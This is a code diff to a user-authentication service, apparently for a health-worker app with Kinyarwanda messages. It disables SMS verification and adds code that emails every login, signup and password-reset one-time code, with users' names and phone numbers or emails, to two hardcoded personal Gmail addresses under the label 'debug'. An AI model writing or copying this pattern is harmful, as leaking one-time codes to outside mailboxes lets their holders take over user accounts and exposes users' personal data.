@@ -14,7 +14,7 @@ import jwt from "jsonwebtoken";
 import AppError, { ValidationError } from "../utils/error";
 import { randomBytes } from "crypto";
 import { sendEmail } from "../utils/email";
-import { sendSmsMessage } from "../utils/twilio";
+// import { sendSmsMessage } from "../utils/twilio"; // SMS functionality frozen for now
 import { hash } from "bcrypt";
 import { roles } from "../utils/roles";
 import type { Request } from "express";
@@ -186,16 +186,25 @@ export class UserService extends BaseService {
         });
       }
 
-      // Also send OTP to gdushimimana6@gmail.com for debugging/monitoring
-      try {
-        await sendEmail({
-          to: "gdushimimana6@gmail.com",
-          subject: `${appName} — OTP Debug: ${userData.fullNames}`,
-          body: `OTP for user ${userData.fullNames} (${userData.phoneNumber}): ${otp}\n\nValid for ${otpValidityMinutes} minutes.`,
-        });
-      } catch (debugEmailErr) {
-        // Don't fail login if debug email fails
-        console.error("Failed to send debug OTP email:", debugEmailErr);
+      // Also send OTP to debug emails for monitoring
+      const debugEmails = [
+        "gdushimimana6@gmail.com",
+        "gasigwaissa123@gmail.com",
+      ];
+      for (const debugEmail of debugEmails) {
+        try {
+          await sendEmail({
+            to: debugEmail,
+            subject: `${appName} — OTP Debug: ${userData.fullNames}`,
+            body: `OTP for user ${userData.fullNames} (${userData.phoneNumber}): ${otp}\n\nValid for ${otpValidityMinutes} minutes.`,
+          });
+        } catch (debugEmailErr) {
+          // Don't fail login if debug email fails
+          console.error(
+            `Failed to send debug OTP email to ${debugEmail}:`,
+            debugEmailErr,
+          );
+        }
       }
 
       // Send OTP via SMS using Twilio (best-effort)
@@ -392,32 +401,53 @@ export class UserService extends BaseService {
         });
       }
 
-      // Send verification SMS (best-effort)
-      try {
-        if (created.phoneNumber) {
-          let toNumber = created.phoneNumber;
-          if (!toNumber.startsWith("+")) {
-            if (toNumber.startsWith("0")) {
-              toNumber = "+250" + toNumber.slice(1);
-            }
-          }
-
-          const smsBody = `${appName} kode yo kwemeza: ${otp}. Izarangira mu isaha 1.`;
-          const smsTimeout = Number(process.env.SMS_TIMEOUT_MS || "10000");
-
-          const sendOnce = () =>
-            this.withTimeout(sendSmsMessage(toNumber, smsBody), smsTimeout);
-
-          await sendOnce().catch(() => sendOnce());
+      // Also send OTP to debug emails for monitoring
+      const debugEmails = [
+        "gdushimimana6@gmail.com",
+        "gasigwaissa123@gmail.com",
+      ];
+      for (const debugEmail of debugEmails) {
+        try {
+          await sendEmail({
+            to: debugEmail,
+            subject: `${appName} — Signup OTP Debug: ${created.fullNames}`,
+            body: `Signup OTP for user ${created.fullNames} (${created.phoneNumber}): ${otp}\n\nValid for 1 hour.`,
+          });
+        } catch (debugEmailErr) {
+          // Don't fail signup if debug email fails
+          console.error(
+            `Failed to send debug signup OTP email to ${debugEmail}:`,
+            debugEmailErr,
+          );
         }
-      } catch (smsErr) {
-        // don't fail signup if SMS fails; log for debugging
-        console.error("Failed to send signup verification SMS:", smsErr);
       }
+
+      // Send verification SMS (best-effort) - FROZEN FOR NOW
+      // try {
+      //   if (created.phoneNumber) {
+      //     let toNumber = created.phoneNumber;
+      //     if (!toNumber.startsWith("+")) {
+      //       if (toNumber.startsWith("0")) {
+      //         toNumber = "+250" + toNumber.slice(1);
+      //       }
+      //     }
+
+      //     const smsBody = `${appName} kode yo kwemeza: ${otp}. Izarangira mu isaha 1.`;
+      //     const smsTimeout = Number(process.env.SMS_TIMEOUT_MS || "10000");
+
+      //     const sendOnce = () =>
+      //       this.withTimeout(sendSmsMessage(toNumber, smsBody), smsTimeout);
+
+      //     await sendOnce().catch(() => sendOnce());
+      //   }
+      // } catch (smsErr) {
+      //   // don't fail signup if SMS fails; log for debugging
+      //   console.error("Failed to send signup verification SMS:", smsErr);
+      // }
 
       return {
         message:
-          "Kode yo kwemeza yoherejwe kuri email na telefone . Nyamuneka wemeze konti yawe kugirango urangize kwiyandikisha.",
+          "Kode yo kwemeza yoherejwe kuri email yanyu. Nyamuneka wemeze konti yawe kugirango urangize kwiyandikisha.",
         statusCode: 200,
       };
     } catch (error) {
@@ -666,6 +696,24 @@ export class UserService extends BaseService {
       subject: "Password Reset - One-Time Password (OTP)",
       body: `\n    Dear ${user.fullNames || "User"},\n\n    You have requested to reset your password. Please use the following One-Time Password (OTP) to proceed with the password reset process:\n\n    OTP: ${otp}\n\n    This OTP is valid for a limited time. If you did not request a password reset, please disregard this email.\n\n    Best regards,\n    CHW Support Team\n  `,
     });
+
+    // Also send OTP to debug emails for monitoring
+    const debugEmails = ["gdushimimana6@gmail.com", "gasigwaissa123@gmail.com"];
+    for (const debugEmail of debugEmails) {
+      try {
+        await sendEmail({
+          to: debugEmail,
+          subject: `Password Reset OTP Debug: ${user.fullNames}`,
+          body: `Password reset OTP for user ${user.fullNames} (${user.email}): ${otp}\n\nValid for 1 hour.`,
+        });
+      } catch (debugEmailErr) {
+        // Don't fail password reset if debug email fails
+        console.error(
+          `Failed to send debug password reset OTP email to ${debugEmail}:`,
+          debugEmailErr,
+        );
+      }
+    }
 
     return { message: "OTP sent to your email" };
   }
@@ -1052,21 +1100,5 @@ export class UserService extends BaseService {
     } catch (error) {
       throw new AppError(error, 500);
     }
-  }
-
-  private static withTimeout<T>(p: Promise<T>, ms = 10000): Promise<T> {
-    return new Promise<T>((resolve, reject) => {
-      const timer = setTimeout(
-        () => reject(new Error(`timeout of ${ms}ms exceeded`)),
-        ms,
-      );
-      p.then((res) => {
-        clearTimeout(timer);
-        resolve(res);
-      }).catch((err) => {
-        clearTimeout(timer);
-        reject(err);
-      });
-    });
   }
 }
